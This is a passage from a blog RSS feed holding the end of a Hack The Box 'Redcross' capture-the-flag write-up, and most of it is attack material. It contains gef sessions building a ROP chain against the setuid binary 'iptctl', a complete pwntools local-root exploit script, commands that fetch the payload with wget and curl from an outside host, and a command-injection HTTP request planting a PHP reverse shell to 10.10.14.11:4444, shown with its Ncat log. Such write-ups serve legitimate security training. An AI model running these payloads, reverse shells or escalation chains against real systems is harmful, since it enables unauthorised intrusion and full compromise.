+ →   0x400780 &lt;setuid@plt+0&gt;   jmp    QWORD PTR [rip+0x2018e2]        # 0x602068
+     0x400786 &lt;setuid@plt+6&gt;   push   0xa
+     0x40078b &lt;setuid@plt+11&gt;  jmp    0x4006d0
+     0x400790 &lt;fork@plt+0&gt;     jmp    QWORD PTR [rip+0x2018da]        # 0x602070
+     0x400796 &lt;fork@plt+6&gt;     push   0xb
+     0x40079b &lt;fork@plt+11&gt;    jmp    0x4006d0
+───────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;iptctl&quot;, stopped, reason: BREAKPOINT
+─────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400780 → setuid@plt()
+──────────────────────────────────────────────────────────────────────────────────────
+gef➤  p $rdi
+$1 = 0x0
+
+</code></pre>
+
+<p>We are successfully calling <code>setuid(0)</code> - what is left is to properlly call the <code>execvp('sh',NULL)</code> function:</p>
+
+<pre><code>gef➤  b * 0x400780
+Breakpoint 1 at 0x400780
+gef➤  b * interactive+271
+Breakpoint 2 at 0x400b5e
+gef➤  r -i &lt; &lt;(python -c 'from pwn import *; print &quot;allow&quot; + &quot;A&quot;*29 + p64(0x400de3) + 
+p64(0) + p64(0x400780) + p64(0x400de3) + p64(0x40046e) + p64(0x400de1) + p64(0) + p64(0) + p64(0x400760) + &quot;\n&quot;  + &quot;127.0.0.1&quot;')
+(..)
+ →   0x400760 &lt;execvp@plt+0&gt;   jmp    QWORD PTR [rip+0x2018f2]        # 0x602058
+     0x400766 &lt;execvp@plt+6&gt;   push   0x8
+     0x40076b &lt;execvp@plt+11&gt;  jmp    0x4006d0
+     0x400770 &lt;exit@plt+0&gt;     jmp    QWORD PTR [rip+0x2018ea]        # 0x602060
+     0x400776 &lt;exit@plt+6&gt;     push   0x9
+     0x40077b &lt;exit@plt+11&gt;    jmp    0x4006d0
+───────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;iptctl&quot;, stopped, reason: BREAKPOINT
+─────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400760 → execvp@plt()
+──────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  x/s $rdi
+0x40046e:   &quot;sh&quot;
+gef➤  i r $rsi
+rsi            0x0  0x0
+gef➤  c
+Continuing.
+process 3876 is executing new program: /bin/dash
+</code></pre>
+
+<p>Simple PoC:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># HTB Redcross local root exploit :: adamm</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./iptctl&#39;</span>, checksec<span style="color:#f92672">=</span>False)
+
+setuid <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;setuid&#39;</span>]
+execvp <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;execvp&#39;</span>]
+sh <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40046e</span>
+
+p <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;./iptctl&#39;</span>,<span style="color:#e6db74">&#39;-i&#39;</span>])
+
+info(<span style="color:#e6db74">&#34;setuid.plt @ </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(setuid))
+info(<span style="color:#e6db74">&#34;execvp.plt @ </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(execvp))
+info(<span style="color:#e6db74">&#34;&#39;sh&#39; @ </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> hex(sh))
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;allow&#34;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">29</span>
+
+<span style="color:#75715e"># setuid(0)</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x400de3</span>) <span style="color:#75715e"># pop rdi; ret</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+=</span> p64(setuid)
+
+<span style="color:#75715e"># execvp(&#34;sh&#34;,NULL)</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x400de3</span>) <span style="color:#75715e"># pop rdi; ret</span>
+payload <span style="color:#f92672">+=</span> p64(sh) <span style="color:#75715e"># &#39;sh&#39; string from the binary</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x400de1</span>) <span style="color:#75715e"># pop rsi; pop r15; ret</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># rsi</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># r15</span>
+payload <span style="color:#f92672">+=</span> p64(execvp)
+
+<span style="color:#75715e"># no pwnlib on remote host, generate payload on your box</span>
+f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/tmp/payload&#34;</span>,<span style="color:#e6db74">&#34;w&#34;</span>)
+f<span style="color:#f92672">.</span>write(payload<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">127.0.0.1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+f<span style="color:#f92672">.</span>close()
+
+info(<span style="color:#e6db74">&#34;payload written to &#39;/tmp/payload&#39;&#34;</span>)
+
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>recv()
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>) <span style="color:#75715e"># trigger</span>
+p<span style="color:#f92672">.</span>interactive()</code></pre></div>
+<p>PoC in the vm:</p>
+
+<pre><code>[~/share]$ python exploit.py
+[+] Starting local process '/tmp/iptctl': pid 3779
+[*] setuid.plt @ 0x400780
+[*] execvp.plt @ 0x400760
+[*] 'sh' @ 0x40046e
+[*] payload written to '/tmp/payload'
+[*] Switching to interactive mode
+$ id
+uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),123(docker)
+$ 
+</code></pre>
+
+<p>Let&rsquo;s test it against the target binary:</p>
+
+<pre><code>penelope@redcross:~$ /opt/iptctl/iptctl -i &lt; &lt;(wget -q -O- http://10.10.14.20:8000/p; cat)
+Entering interactive mode
+whoami
+root
+cat /root/root.txt
+892a1f(..)
+</code></pre>
+
+<p><h1>bonus</h1>
+There was unintended command injection vulnerability in the admin panel:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /pages/actions.php <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">admin.redcross.htb</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
+Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">https://admin.redcross.htb/?page=firewall</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">321</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=hk6c2h5tqrdp820tjs4juimti1</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+
+ip=127.0.0.1%26php+-r+&#39;$sock%3dfsockopen(&#34;10.10.14.11&#34;,4444)%3bexec(&#34;/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263&#34;)%3b&#39;;AAAAAAAA&amp;id=12&amp;action=deny</code></pre></div>
+<p>So in fact, we could get root shell directly from <code>www-data</code></p>
+
+<pre><code>Ncat: Connection from 10.10.10.113:41000.
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ (curl http://10.10.14.20:8000/p 2&gt;/dev/null; cat) | /opt/iptctl/iptctl -i
+id
+uid=0(root) gid=33(www-data) egid=0(root) groups=0(root),33(www-data)
+cat /root/root.txt
+892a1f(..)
+</code></pre>
+
+<p><br></p>
+
+<p>That&rsquo;s it! Thanks for reading.
+<hr></p>
+<div class="footnotes">
+
+<hr />
+
+<ol>
+<li id="fn:1"><a href="https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html" target="_blank">https://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html</a>
+ <a class="footnote-return" href="#fnref:1"><sup>[return]</sup></a></li>
+</ol>
+</div>
+]]></content>
+        </item>
+        
+    </channel>
+</rss>
